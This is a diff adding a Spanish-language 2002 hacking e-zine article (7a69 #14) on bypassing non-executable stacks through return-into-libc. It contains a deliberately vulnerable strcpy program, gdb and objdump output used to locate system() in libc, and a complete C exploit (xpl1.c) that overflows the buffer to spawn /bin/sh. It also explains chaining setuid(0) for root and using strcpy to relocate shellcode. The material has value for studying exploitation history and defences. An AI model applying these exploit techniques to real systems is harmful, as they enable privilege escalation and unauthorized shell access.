@@ -1,0 +1,294 @@
+|-----------------------------------------------------------------------------|
+  [ 7a69#14 ]                                                  [ 21-10-2002 ]
+ \                                                                           /
+  \-------------------------------------------------------------------------/
+   { 13 - Stack overflow con stack no ejecutable.                  }{ Ripe }
+   |-----------------------------------------------------------------------|
+
+
+
+1.- Introduccion
+----------------
+
+	Os preguntareis, seguro, ¿porque otro articulo sobre stack overflow si
+ya existen miles, y muy buenos, en la red? La respuesta es sencilla. No voy a
+hablar sobre el 'tipico' metodo con el que se explota un stack overflow, sino
+de un metodo alternativo que nos permite saltarnos el sistema de seguridad de
+moda; el stack no-ejecutable.
+
+
+
+
+2.- No-ejecutable stack
+-----------------------
+
+	Muchos de los exploits que han aparecido a lo largo de la historia se 
+han servido del stack para colocar la shellcode, aprovechando que esta (pese
+a no ser necesario para el correcto funcionamiento de un programa normal) era
+ejecutable.
+
+	La clara solucion planteada para la evasion de estos exploits es la
+no-ejecucion del stack, lo cual se logra, en linux, modificando la entrada 
+usada por el selector CS de los procesos en la GDT. En linux 2.0, de dicha
+entrada de la GDT se podia sacar que base 0x00000000 y limite 0xc0000000, y
+es que linux dividia la memoria en 2 segmentos, el segmento del kernel y el
+de los procesos de usuario. En 2.2 y 2.4 se ha optado por un solo segmento,
+pasando a tener en dicha entrada 0x00000000 como base y 0xffffffff como 
+limite, protegiendo entonces de una forma alternativa las paginas 
+pertenecientes al kernel (a simple vista parece una tonteria, pero gracias a
+ello se gana un 20% de rendimiento, segun me han comentado). Sabemos que el 
+top del stack esta en 0xc0000000 y que el kernel cede 8 megas para el stack 
+de cada proceso (la cual cosa quiere decir que tendremos stack de 0xbff70000 
+a 0xc0000000), por lo que cambiando la entrada usada por el CS de los 
+procesos en la GDT de manera que se obtenga base 0x0000000 y limite 
+0xbff70000 evitaremos que el stack pueda ejecutarse.
+
+	Si no has entendido demasiado esto ultimo que he comentado no te 
+preocupes, pues no es necesario para la compresion del resto del articulo.
+
+
+
+3.- Donde saltar?
+-----------------
+
+	No podemos saltar al stack, sin embargo nos quedan aun muchos lugares a
+los que saltar. Por ejemplo a alguna de las funciones de la libc, como puede
+ser system(). Obviamente tendriamos que preparar el 'entorno' para que system
+se sienta comoda y haga lo que nosotros queremos, darnos un shell. Si hacemos 
+un programa sencillo, como el siguiente podemos ver que es lo que espera 
+encontrarse system.
+
+
+---/ system_test.c /---
+
+#include <stdlib.h>
+
+int main() {
+	system("/bin/echo soy un test!!");
+}
+
+---/ system_test.c /---
+
+	
+	Debuggeamos un poco...
+
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8048340 <main>:       push   %ebp
+0x8048341 <main+1>:     mov    %esp,%ebp
+0x8048343 <main+3>:     sub    $0x8,%esp
+0x8048346 <main+6>:     and    $0xfffffff0,%esp
+0x8048349 <main+9>:     movl   $0x80483b8,(%esp,1)   <--- main coloca el 
+                                                          argumento en la pila.
+0x8048350 <main+16>:    call   0x8048258 <system>    <--- luego llama a system.
+0x8048355 <main+21>:    mov    %ebp,%esp
+0x8048357 <main+23>:    pop    %ebp
+0x8048358 <main+24>:    ret
+0x8048359 <main+25>:    lea    0x0(%esi,1),%esi
+End of assembler dump.
+(gdb) b *system
+Breakpoint 1 at 0x8048258
+(gdb) r
+Starting program: /home/ripe/./a.out
+Breakpoint 1 at 0x40065c30
+
+Breakpoint 1, 0x40065c30 in system () from /lib/libc.so.6
+(gdb) x/2x $esp
+0xbffff7bc:     0x08048355      0x080483b8
+
+
+	Tras entrar en system tenemos en la pila la posicion de retorno y un
+puntero a la cadena que debe pasar al interprete de ordenes.
+
+
+
+4.- Programa vulnerable.
+------------------------
+
+	Nuestro programa vulnerable es el siguiente. Se trata de un simple
+stack overflow, como los muchos que habras visto :)
+
+---/ vuln.c /---
+
+#include <stdio.h>
+
+int main(int argc, char **argv) {
+        char buf[128];
+        strcpy(buf, argv[1]);
+}
+
+---/ vuln.c /---
+
+
+
+5.- Exlotandolo!!
+-----------------
+	
+	Sabemos que podemos saltar a system(), cuyo codigo se encuentra
+mapeado junto al resto de la libc (/lib/libc.so.6), asi que lo primero
+que tenemos que saber es la posicion en la memoria a la que saltar; esta
+sera base_de_la_libc+offset_a_system.
+
+	Sacar la base de la libc es sencillo, basta con hace lo siguiente:
+
+	
+	barracuda ~$ ldd vuln
+	libc.so.6 => /lib/libc.so.6 (0x40024000)
+	/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000
+	barracuda ~#
+
+	
+	Ya tenemos la base, que es 0x40024000. El offset no es mucho mas
+complicado de conseguir.
+
+
+	barracuda ~$ objdump -t /lib/libc.so.6  | grep system
+	00041c30  w    F .text  00000355              system
+	000f4ae0 g     F .text  00000044              svcerr_systemerr
+	00041c30 g     F .text  00000355              __libc_system
+	barracuda ~$
+
+	
+	Ya tenemos la base y el offset, por lo que ya sabemos a donde hay
+que saltar. Pero nos falta algo importante aun, pasarle el argumento adecuado
+a system(), "/bin/sh". Podriamos colocar esta cadenda en el stack (junto al
+buffer, en una variable de entorno, en argv[0]), y pasarle a system un puntero
+a ella. Se nos presenta aqui el mismo problema que con la localizacion de
+shellcodes que solucionabamos a base de NOP's. La solucion aqui vuelve a ser
+sencilla, siendo un simil de la presentada para las shellcodes. Añadiremos
+delante la cadena "/bin/sh\0", tantos 0x20 (que corresponde al caracter
+' ') como queramos, pues system() ignora los espacios a la izquierda.
+
+
+	En definitiva, el buffer que tenemos que pasarle al programa es...
+
+
+                                                            Seria la posicion de 
+                                                             retorno de system()
+                                                                      |
+                                                                      |
+	[ 132 bytes de Basura ][ alineacion en GCC ][ PTR ][ 4 bytes de basura ][ PTR ]
+                                                       |                           |
+					               |                           |
+                                               Puntero a system()          Puntero al stack 
+                                                                           (".../bin/sh\0")
+
+---/ xpl1.c /---
+
+#include <stdio.h>
+
+#define SYSTEM_ADDR     0x40024000+0x00041c30  /* LIBC_BASE + SYSTEM_OFFSET */
+#define TOEXEC_ADDR     0xbfffff50
+
+#define BUFSZ   128+4+4+4+4+4+4
+
+int main(int argc, char **argv) {
+        char toexec_addr[1024];
+        char evilbuf[BUFSZ+1];
+        char *exec_argv[3];
+        char *exec_envp[2];
+        unsigned long *ptr;
+        if (argc<2) exit(0);
+        memset(toexec_addr, ' ', 1023);
+        strcpy(toexec_addr+1023-strlen("/bin/sh"), "/bin/sh");
+        exec_argv[0]=argv[1];
+        exec_argv[1]=evilbuf;
+        exec_argv[2]=NULL;
+        exec_envp[0]=toexec_addr;
+        exec_envp[1]=NULL;
+        memset(evilbuf, 'A', BUFSZ);
+
+        ptr=(unsigned long *)&evilbuf[BUFSZ-12];
+        *ptr=SYSTEM_ADDR;
+
+        ptr=(unsigned long *)&evilbuf[BUFSZ-4];
+        *ptr=TOEXEC_ADDR;
+
+        evilbuf[BUFSZ]=0;
+        execve(argv[1], exec_argv, exec_envp);
+}
+
+---/ xpl1.c /---
+
+
+	Este exploit esta pensado para la version 3 de GCC que coloca unos 
+bytes de alineamiento entre las variables locales y el EBP salvado en la 
+pila.
+
+
+
+
+6.- Alguna cosa mas
+-------------------
+
+	En muchas ocasiones, y lo hemos visto en muchas shellcodes, para que
+un exploit nos de root hemos de llamar a setuid(0) antes de llamar a /bin/sh,
+en otras ocasiones es necesario romper un entorno chroot, por lo que hay que
+realizar cosas complejas que system() no nos permite. Todo esto tiene facil
+solucion, como veremos.
+
+	Mediante esta forma de trabajar, haciendo que RET salte a la libc 
+podemos realizar 2 saltos, pues, si miramos el buffer que introducimos en
+xpl1.c, vemos que despues de system() se saltara a los 4 bytes basura que
+hay entre los dos PTR. Esto  quiere decir, que podriamos pasar como
+buffer lo siguiente.
+
+
+	                                      puntero a setuid()      puntero a
+			                          de la libc         ".../bin/sh"
+			                               |                  |
+	                                               |                  |
+	[ 132 bytes de Basura ][ alineacion en GCC ][ PTR ][ PTR ][ 0 ][ PTR ]
+                                                              |
+	                                                      |
+						       putero a system()
+							  de la libc
+
+
+	En una situacion muy similar a la que vimos anteriormente, en este
+se ejecutaria setuid(0) y este retornaria a la system() pasandole como 
+argumento ".../bin/sh", logrado de esta manera superar nuestro primer bache.
+
+	Esto no es aplicable en el caso de la ruptura del chroot, pues hay
+que realizar cosas algo mas complejas (y este metodo solo nos permite
+llamar a 2 funciones de la libc). Lo que tenemos que hacer entonces es
+lograra que se ejecute una shellcode autentica, pero tenemos el problema de
+la prohibición de ejecucion en el stack. Por suerte, nuevamente, la libc nos
+brinda la posibilidad de hacerlo, gracias a strcpy(). Si colocamos la shellcode
+en el stack, usando strcpy() podemos moverla a otro lado y hacer que el propio 
+strcpy retorne a ella. El buffer, en definitiva seria...
+
+
+                                                                   puntero al stack
+                                                                     donde esta la
+                                                                       shellcode
+                                                    strcpy()         al principio
+                                                       |                    |
+                                                       |                    |
+	[ 132 bytes de Basura ][ alineacion en GCC ][ PTR ][ PTR ][ PTR ][ PTR ]
+                                                               \    /              
+                                                                 ||                
+                                                         Alla a donde vamos
+						             a mover la           
+						              shellcode
+
+	Con todo ello, lo que lograremos es que se ejecute lo siguiente tras
+el ret de main; strcpy(shellcode, nuevo_sitio) para luego llamar a 
+nuevo_sitio(). Obviamente para que ello funcion, nuevo_sitio debe  estar en 
+una zona de la memoria con permisos W (escritura) y X (ejecucion).
+
+
+
+
+7.- Conclusion
+--------------
+
+	La no-ejecucion del stack se presenta como una solucion a la 
+explotacion de programas, sin embargo en el caso del stack overflow es
+realmente sencillo evadir dicha proteccion como ya hemos visto en este
+documento. Pese a todo, muchos de los parches de seguridad que existen
+hoy en dia, toman medidas ante este tipo de tecnicas.
+
+
+*EOF*
